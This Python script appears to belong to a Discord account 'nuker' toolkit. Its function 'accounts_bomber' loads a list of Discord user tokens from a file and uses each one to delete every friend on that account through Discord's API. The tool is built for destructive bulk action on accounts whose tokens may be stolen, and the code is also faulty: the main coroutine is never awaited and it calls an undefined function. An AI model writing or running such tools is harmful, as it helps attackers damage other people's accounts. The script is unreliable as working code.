import aiohttp
import asyncio
from time import *

from utils.Setting.setup_most import heads

asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

async def remove_friend(token: str):
    base_url = "https://discord.com/api/v10/users/@me/relationships"
    
    async with (
        aiohttp.ClientSession() as session,
        session.get(base_url, headers=heads(token=token)) as response
    ):
        friend_infos = await response.json()
        
        for friend_info in friend_infos:
            async with session.delete(f"{base_url}/{friend_info['id']}", headers=heads(token=token)) as response:
                pass
            


async def accounts_bomber():
    tokens: list[str] = []
    with open("token.txt", "r", encoding="utf-8") as f:
        for line in f.readlines():
            # 주석 처리된 문장 무시
            if line.startswith("#"):
                continue
            tokens.append(line)
    
    await asyncio.gather(*[remove_friend(token=token) for token in tokens])

if __name__ == "__main__":
    accounts_bomber()
    sleep(3)
    Hydron()